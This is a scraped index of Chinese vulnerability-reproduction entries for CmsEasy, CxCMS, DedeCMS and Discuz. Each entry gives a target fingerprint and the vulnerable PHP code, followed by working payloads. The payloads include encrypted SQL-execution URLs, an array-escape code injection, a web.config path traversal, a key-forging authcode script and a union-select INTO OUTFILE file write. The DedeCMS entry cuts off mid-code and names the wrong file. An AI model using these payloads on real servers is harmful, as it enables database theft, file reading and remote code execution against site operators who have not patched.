","date":"0001-01-01","objectID":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 CmsEasy 存在SQL注入漏洞，通过文件 service.php 加密SQL语句执行即可执行任意SQL命令 ","date":"0001-01-01","objectID":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 CmsEasy V7.7.5_20210919 ","date":"0001-01-01","objectID":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"cmseasyedit\" ","date":"0001-01-01","objectID":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 lib/default/crossall_act.php 其中需要注意的代码为 function execsql_action(){ $sqlquery=front::get(\"sql\"); $sqlquery=service::getInstance()-\u003eunlockString($sqlquery,\"cmseasy_sql\"); $returndata=tdatabase::getInstance()-\u003erec_query_one($sqlquery); echo json_encode($returndata); exit; } function execsqls_action(){ $sqlquery=front::get(\"sql\"); $sqlquery=service::getInstance()-\u003eunlockString($sqlquery,\"cmseasy_sql\"); $returndata=tdatabase::getInstance()-\u003erec_query($sqlquery); echo json_encode($returndata); exit; } function execupdate_action(){ $sqlquery=front::get(\"sql\"); $sqlquery=service::getInstance()-\u003eunlockString($sqlquery,\"cmseasy_sql\"); $returndata=tdatabase::getInstance()-\u003equery($sqlquery); echo json_encode($returndata); exit; } 代码中传入参数 sql， 然后使用方法 unlockString 解码执行 SQL语句 查看文件 lib/table/service.php public static function lockString($txt,$key='cmseasy_sql') { $chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+\"; $nh = rand(0,64); $ch = $chars[$nh]; $mdKey = md5($key.$ch); $mdKey = substr($mdKey,$nh%8, $nh%8+8); $txt = base64_encode($txt); $tmp = ''; $i=0;$j=0;$k = 0; for ($i=0; $i\u003cstrlen($txt); $i++) { $k = $k == strlen($mdKey) ? 0 : $k; $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64; $tmp .= $chars[$j]; } return urlencode($ch.$tmp); } /**对字符串进行解密。 crossall_act文件使用 * @param $txt * @param string $key * @return bool|string */ public static function unlockString($txt,$key='cmseasy_sql') { $txt = urldecode($txt); $chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+\"; $ch = $txt[0]; $nh = strpos($chars,$ch); $mdKey = md5($key.$ch); $mdKey = substr($mdKey,$nh%8, $nh%8+8); $txt = substr($txt,1); $tmp = ''; $i=0;$j=0; $k = 0; for ($i=0; $i\u003cstrlen($txt); $i++) { $k = $k == strlen($mdKey) ? 0 : $k; $j = strpos($chars,$txt[$i])-$nh - ord($mdKey[$k++]); while ($j\u003c0) $j+=64; $tmp .= $chars[$j]; } return base64_decode($tmp); } 文件中得到了 $key='cmseasy_sql' 和加解密方法，构造请求获取账号密码md5 /?case=crossall\u0026act=execsql\u0026sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5 ","date":"0001-01-01","objectID":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/cmseasy-crossall_act.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"CmsEasy language_admin.php 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 CmsEasy 后台存在命令执行漏洞，通过文件 language_admin.php 对部分文件进行写入操作，导致任意文件写入 ","date":"0001-01-01","objectID":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 CmsEasy V7.7.5_20210919 ","date":"0001-01-01","objectID":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"cmseasyedit\" ","date":"0001-01-01","objectID":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 lib/admin/language_admin.php function add_action() { $lang_choice='system.php'; if (isset($_GET['lang_choice'])){ $lang_choice=$_GET['lang_choice']; } if (front::post('submit')) { $langid=front::get('id'); $lang=new lang(); $langdata = $lang-\u003egetrows('id='.$langid, 1); if (is_array($langdata)){ $langurlname=$langdata[0]['langurlname']; }else{ front::alert(lang_admin('language_pack').lang_admin('nonentity')); } $path=ROOT.'/lang/'.$langurlname.'/'.$lang_choice; $tipspath=ROOT.'/lang/'.$langurlname.'/'.$lang_choice; $content=file_get_contents($path); $tipscontent=file_get_contents($tipspath); $replace=\"'\".front::$post['key'].\"'=\u003e'\".front::$post['val'].\"',\"; $tipsreplace=\"'\".front::$post['key'].\"'=\u003e'\".front::$post['cnnote'].\"',\"; $content=str_replace(');',\"\\n\".$replace.');',$content); file_put_contents($path,$content); $pos=strpos($tipscontent,$tipsreplace); if ($langurlname != 'cn'\u0026\u0026$pos === false) { $tipscontent=str_replace(');',\"\\n\".$tipsreplace.');',$tipscontent); file_put_contents($tipspath,$tipscontent); } if ($_GET['site'] != 'default') { $ftp=new nobftp(); $ftpconfig=config::get('website'); $ftp-\u003econnect($ftpconfig['ftpip'],$ftpconfig['ftpuser'],$ftpconfig['ftppwd'],$ftpconfig['ftpport']); $ftperror=$ftp-\u003ereturnerror(); if ($ftperror) { exit($ftperror); } else { $ftp-\u003enobchdir($ftpconfig['ftppath']); $ftp-\u003enobput($ftpconfig['ftppath'].'/lang/'.$langurlname.'/'.$lang_choice,$path); } } event::log(lang_admin('add_to').lang_admin('language_pack'),lang_admin('success')); // $shepi='\u003cscript type=\"text/javascript\"\u003ealert(\"'.lang_admin('dosomething').lang_admin('complete').'\");gotoinurl(\"'.url('language/edit/id/'.$langdata[0]['id'],true); $shepi=$shepi.'\u0026lang_choice='.$lang_choice; $shepi=$shepi.'\");\u003c/script\u003e'; echo $shepi; //exit; //front::refresh(url('language/edit',true)); } $this-\u003eview-\u003elang_choice=$lang_choice; } 访问这个页面 其中参数有三个，分别为 key , cnnote, val 传入参数后,查看 lang/cn/system_custom.php 文件中 \u003c?php /* *中文语言包 */ return array( '2'=\u003e'3',); ?\u003e 由于没有对传入的参数进行过滤，通过写入特殊的参数就可以逃逸出数组造成命令执行 分别传入两次参数 test1 test2 test3); 写入后文件内容 \u003c?php /* *中文语言包 */ return array( 'test2'=\u003e'test3);',); ?\u003e 再传入一次参数 test4 ,test5, ,phpinfo());/* 写入后文件内容 访问文件 /lang/cn/system_custom.php ","date":"0001-01-01","objectID":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/cmseasy-language_admin.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"CmsEasy update_admin.php 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件 ","date":"0001-01-01","objectID":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 CmsEasy V7.7.5_20210919 ","date":"0001-01-01","objectID":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"cmseasyedit\" ","date":"0001-01-01","objectID":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 lib/admin/update_admin.php 其中需要注意的代码为 function downfile_action() { $url = front::get('url'); $url=service::getInstance()-\u003eunlockString($url,\"cmseasy_url\"); $res = $this-\u003eget_file($url, 'cache'); if (!$res) { $res = array( 'err' =\u003e 1, 'data' =\u003e lang_admin('update_package_download_failed'), ); } else { @unlink('upgrade/config_cn.php'); @unlink('upgrade/config_cn.tmp.php'); @unlink('upgrade/upgrade.sql'); @unlink('upgrade/command.php'); front::remove(ROOT.'/cache/data'); front::remove(ROOT.'/cache/template');//清空全部语言 $langdata=getlang(); if($langdata != \"\"){ foreach ($langdata as $key=\u003e$val){ front::remove(ROOT.'/cache/'.$val['langurlname']); front::remove(ROOT.'/'.$val['langurlname'].'/template'); } } //先清空缓存 user::deletesession(); category::deletesession(); //提取分类 if(file_exists(ROOT.\"/lib/table/type.php\")) { type::deletesession(); } //提取专题 if(file_exists(ROOT.\"/lib/table/special.php\")) { special::deletesession(); } $archive = new PclZip('cache/patch.zip'); $archive-\u003eextract(PCLZIP_OPT_PATH, ROOT, PCLZIP_OPT_REPLACE_NEWER); if(file_exists('upgrade/upgrade.sql')) { $sqlquery = file_get_contents('upgrade/upgrade.sql'); $sqlquery = str_replace('`cmseasy_', '`' . config::getdatabase('database', 'prefix'), $sqlquery); $sqlquery = str_replace(\"\\r\", \"\", $sqlquery); $sqls = preg_split(\"/;(--)*[ \\t]{0,}\\n/\", $sqlquery); $this-\u003eexec_cms_sql($sqls); } if(file_exists('upgrade/command.php')){ include ROOT . '/upgrade/command.php'; } $res = array( 'err' =\u003e 0, 'message' =\u003e $this-\u003emessage, 'data' =\u003e lang_admin('upgrade_successful'), ); } echo json_encode($res); exit; } 其中使用 unlockString 和 get_file 方法 $url = front::get('url'); $url=service::getInstance()-\u003eunlockString($url,\"cmseasy_url\"); $res = $this-\u003eget_file($url, 'cache'); 写入后在上层目录写入文件，即Web根目录，创建压缩包并上传可访问的服务器上 zip phpinfo.zip phpinfo.php 构造下载请求 /index.php?case=update\u0026act=downfile\u0026admin_dir=admin\u0026site=default\u0026url=buTdBnP8%3DJ%3DELYuF8Z2IwZyM-awr9fH%3D0cax6mxICukxw ","date":"0001-01-01","objectID":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/cmseasy-update_admin.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"CxCMS Resource.ashx 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 CxCMS 存在任意文件读取，由于 /Sys/Handler/Resource.ashx 页面 _FilePath 参数过滤不严，导致可以读取系统敏感文件。 ","date":"0001-01-01","objectID":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 CxCMS ","date":"0001-01-01","objectID":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Powered by CxCms\" ","date":"0001-01-01","objectID":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 关键字\"Powered by CxCms\" 验证POC /Sys/Handler/Resource.ashx?_FilePath=../../web.config ","date":"0001-01-01","objectID":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/cxcms-resource.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"DedeCMS common.func.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 DocCMS flink.php 文件存远程命令执行漏洞，攻击者通过漏洞可以执行任意命令 ","date":"0001-01-01","objectID":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 DedeCMS v5.81 beta 内测版 ","date":"0001-01-01","objectID":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"DedeCMS_V5.8.1\" ","date":"0001-01-01","objectID":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 查看文件 include/common.func.php 的 ShowMsg方法 function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0) { if (empty($GLOBALS['cfg_plus_dir'])) { $GLOBALS['cfg_plus_dir'] = '..'; } if ($gourl == -1) { $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; if ($gourl == \"\") { $gourl = -1; } } $htmlhead = \" \u003chtml\u003e\\r\\n\u003chead\u003e\\r\\n\u003ctitle\u003eDedeCMS提示信息\u003c/title\u003e\\r\\n \u003cmeta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset={dede:global.cfg_soft_lang/}\\\" /\u003e \u003cmeta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\\\"\u003e \u003cmeta name=\\\"renderer\\\" content=\\\"webkit\\\"\u003e \u003cmeta http-equiv=\\\"Cache-Control\\\" content=\\\"no-siteapp\\\" /\u003e \u003clink rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"{dede:global.cfg_assets_dir/}/pkg/uikit/css/uikit.min.css\\\" /\u003e \u003clink rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"{dede:global.cfg_assets_dir/}/css/manage.dede.css\\\"\u003e \u003cbase target='_self'/\u003e \u003c/head\u003e \u003cbody\u003e \" . (isset($GLOBALS['ucsynlogin']) ? $GLOBALS['ucsynlogin'] : '') . \" \u003ccenter style=\\\"width:450px\\\" class=\\\"uk-container\\\"\u003e \u003cdiv class=\\\"uk-card uk-card-small uk-card-default\\\" style=\\\"margin-top: 50px;\\\"\u003e \u003cdiv class=\\\"uk-card-header\\\" style=\\\"height:20px\\\"\u003eDedeCMS 提示信息！\u003c/div\u003e \u003cscript\u003e\\r\\n\"; $htmlfoot = \" \u003c/script\u003e \u003c/center\u003e \u003cscript src=\\\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit.min.js\\\"\u003e\u003c/script\u003e \u003cscript src=\\\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit-icons.min.js\\\"\u003e\u003c/script\u003e \u003c/body\u003e\\r\\n\u003c/html\u003e\\r\\n\"; $litime = ($limittime == 0 ? 1000 : $limittime); $func = ''; if ($gourl == '-1') { if ($limittime == 0) { $litime = 3000; } $gourl = \"javascript:history.go(-1);\"; } if ($gourl == '' || $onlymsg == 1) { $msg = \"\u003cscript\u003ealert(\\\"\" . str_replace(\"\\\"\", \"“\", $msg) . \"\\\");\u003c/script\u003e\"; } else { //当网址为:close::objname 时, 关闭父框架的id=objname元素 if (preg_match('/close::/', $gourl)) { $tgobj = trim(preg_replace('/close::/', '', $gourl)); $gourl = 'javascript:;'; $func .= \"window.parent.document.getElementById('{$tgobj}').style.display='none';\\r\\n\"; } $func .= \"var pgo=0; function JumpUrl(){ if(pgo==0){ location='$gourl'; pgo=1; } }\\r\\n\"; $rmsg = $func; $rmsg .= \"document.write(\\\"\u003cdiv style='height:130px;font-size:10pt;background:#ffffff'\u003e\u003cbr /\u003e\\\");\\r\\n\"; $rmsg .= \"document.write(\\\"\" . str_replace(\"\\\"\", \"“\", $msg) . \"\\\");\\r\\n\"; $rmsg .= \"document.write(\\\"\"; if ($onlymsg == 0) { if ($gourl != 'javascript:;' \u0026\u0026 $gourl != '') { $rmsg .= \"\u003cbr /\u003e\u003ca href='{$gourl}'\u003e如果你的浏览器没反应，请点击这里...\u003c/a\u003e\"; $rmsg .= \"\u003cbr/\u003e\u003c/div\u003e\\\");\\r\\n\"; $rmsg .= \"setTimeout('JumpUrl()',$litime);\"; } else { $rmsg .= \"\u003cbr/\u003e\u003c/div\u003e\\\");\\r\\n\"; } } else { $rmsg .= \"\u003cbr/\u003e\u003cbr/\u003e\u003c/div\u003e\\\");\\r\\n\"; } $msg = $htmlhead . $rmsg . $htmlfoot; } $tpl = new DedeTemplate(); $tpl-\u003eLoadString($msg); $tpl-\u003eDisplay(); } /** * 获取验证码的session值 * * @return string */ 这里注意到 当 $gourl 变量为 -1 时调用 ShowMsg方法, 则请求参数 Referer 为用户可控参数 向下看，可以发现可控的变量传入两个方法 $tpl = new DedeTemplate(); $tpl-\u003eLoadString($msg); $tpl-\u003eDisplay(); 追踪方法来到 include/dedetemplate.class.php 文件 ParseTemplate() 则是模版渲染的方法，再往下看 public function Display() { global $gtmpfile; extract($GLOBALS, EXTR_SKIP); $this-\u003eWriteCache(); include $this-\u003ecacheFile; } 追踪一下 WriteCache() 方法 看 GetResult() 方法 和 CheckDisableFunctions() 方法 public function GetResult() { if (!$this-\u003eisParse) { $this-\u003eParseTemplate(); } $addset = ''; $addset .= '\u003c' . '?php' . \"\\r\\n\" . 'if(!isset($GLOBALS[\\'_vars\\'])) $GLOBALS[\\'_vars\\'] = array(); ' . \"\\r\\n\" . '$fields = array();' . \"\\r\\n\" . '?' . '\u003e'; return preg_replace(\"/\\?\" . \"\u003e[ \\r\\n\\t]{0,}\u003c\" . \"\\?php/\", \"\", $addset . $this-\u003esourceString); } public function CheckDisabledFunctions($str, \u0026$errmsg = '') { global $cfg_disable_funs; $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite'; // 模板引擎增加disable_functions if (!defined('DEDEDISFUN')) { $tokens = token_get_all_nl($str); $disabled_functions = explode(',', $cfg_disable_funs); foreach ($toke","date":"0001-01-01","objectID":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/dedecms-common.func.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Discuz 3.4 最新版后台getshell ","date":"0001-01-01","objectID":"/discuz-3.4-%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/:0:0","tags":null,"title":"","uri":"/discuz-3.4-%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/"},{"categories":null,"content":"漏洞描述 最新版下载地址：https://gitee.com/Discuz/Discuz \u003c?php $uc_key=\"123456\";// $time = time() + 720000; $str = \"time=\".$time.\"\u0026action=updateapps\"; $code = authcode($str,\"ENCODE\",$uc_key); $code = str_replace('+','%2b', $code) ; $code = str_replace('/','%2f', $code) ; echo \"$code\"; function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key != '' ? $key : '123456'); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i \u003c= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i \u003c 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i \u003c $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'DECODE') { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() \u003e 0) \u0026\u0026 substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } ?\u003e ","date":"0001-01-01","objectID":"/discuz-3.4-%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/:1:0","tags":null,"title":"","uri":"/discuz-3.4-%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/"},{"categories":null,"content":"Discuz!X 3.4 admincp_setting.php 后台SQL注入漏洞 ","date":"0001-01-01","objectID":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 不久以前Discuz!X的后台披露了一个sql注入的漏洞，这里也要感谢漏洞的发现和研究者（无糖的kn1f3)。 ","date":"0001-01-01","objectID":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Discuz!X \u003c3.4 R20191201 版本 ","date":"0001-01-01","objectID":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 将 upload目录下的文件拷入phpstudy下的WWW目录打开网站按照步骤安装就行了 ","date":"0001-01-01","objectID":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 来到后台页面, 在 UCenter 应用 ID 位置的参数添加单引号并抓包 发现出现SQL语句报错 使用报错注入去获取版本号 这里的参数为 settingnew[uc][appid] 查看文件 \\source\\admincp\\admincp_setting.php， 在2677行找到了输入点 根据报错语句找到SQL语句执行点，在文件uc_client\\model\\base.php 中的 206行 通过这里的语句可以看到我们可以使用 union注入 的方法来写入恶意文件(secure_file_priv不能为Null) 1' union select \"\u003c?php phpinfo();?\u003e\" into outfile 'D:/test.php';--+ 也可以使用其他的方法 